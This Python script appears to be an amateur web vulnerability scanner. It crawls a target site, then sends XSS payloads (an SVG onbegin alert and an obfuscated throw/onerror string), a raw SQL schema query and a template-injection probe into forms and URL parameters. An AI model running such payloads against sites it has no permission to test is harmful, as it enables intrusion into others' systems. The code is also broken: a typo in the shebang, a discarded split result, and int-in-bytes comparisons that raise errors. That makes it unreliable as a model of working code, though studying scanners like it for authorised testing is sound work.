#!/usr/bin/evn python

import requests 
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from requests.models import Response


target_links = []

class Scaner:
    def __init__(self, url, ignore_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.links_to_ignore = ignore_links

    def extract_links_from(self, url):
        response = requests.get(url)
        return re.findall('(?:href=")(.*?)"', str(response.content))

    def crawl(self, url=None):
        if url == None:
            url = self.target_url
        href_links = self.extract_links_from(url)
        for link in href_links:
            link = urljoin(url, link)

            if "#" in link:
                link.split("#")[0]

            if self.target_url in link and link not in self.target_links and link not in self.links_to_ignore :
                self.target_links.append(link)
                print(link)
                self.crawl(link)

    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_url =  BeautifulSoup(response.content, features="html.parser")
        return parsed_url.findAll("form")

    def submit_form(self, form, value, url):
        action = form.get("action")
        post_url = urljoin(url, action)
        print(action)
        method = form.get("method")

        inputs_list = form.findAll("input")
        post_data = {}
        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value

            post_data[input_name] = input_value
        if method == "post":
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url, params=post_data)

    def run_scanner(self):
        for link in self.target_links:
            forms = self.extract_forms(link)
            for form in forms:
                print("[+] Testing form in " + link)
                is_vulnerable_to_xss = self.test_xss_in_form(form, link)
                if is_vulnerable_to_xss:
                    print(f"\n\n[***] XSS Discovered {link} in the following form")
                    print(form)

                if "=" in link:
                    print("[+] Testing " + link)
                    is_vulnerable_to_xss = self.test_xss_in_link(link)
                    if is_vulnerable_to_xss:
                        print(f"\n\n[***] XSS Discovered {link} in the following link.")

                    is_vulnerable_to_server_injection = self.test_sqlInjection_in_link(link)
                    # if is_vulnerable_to_server_injection:
                        # print(f"\n\n[***] SQLInjection Discovered {link} in the following link.")
                    print(is_vulnerable_to_server_injection)


                    is_vulnerable_to_server_injection = self.test_server_sideInjection_in_link(link)
                    if is_vulnerable_to_server_injection:
                        print(f"\n\n[***] Server Side Injection Discovered {link} in the following link.")

    def test_xss_in_link(self, url):
        xss_script = "5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27"
        url = url.replace("=", "="+ xss_script)
        response = self.session.get(url)
        return xss_script in response.content or 1337 in response.content

    def test_xss_in_form(self, form, url):
        xss_script = '"><svg>animatetransform onbegin=alert(1)>'
        response = self.submit_form(form, xss_script, url)
        return xss_script in response.content or 1 in response.content

    def test_sqlInjection_in_link(self, url):
        sqlInjection_script = "SELECT * FROM INFORMATION_SCHEMA.TABLES"
        url = url.replace("=", "="+ sqlInjection_script)
        response = self.session.get(url)
        return response.content

    def test_server_sideInjection_in_link(self, url):
        server_injection_script = "<%25%3d+-7*50+%25>"
        url = url.replace("=", "="+ server_injection_script)
        response = self.session.get(url)
        return -350 in response.content
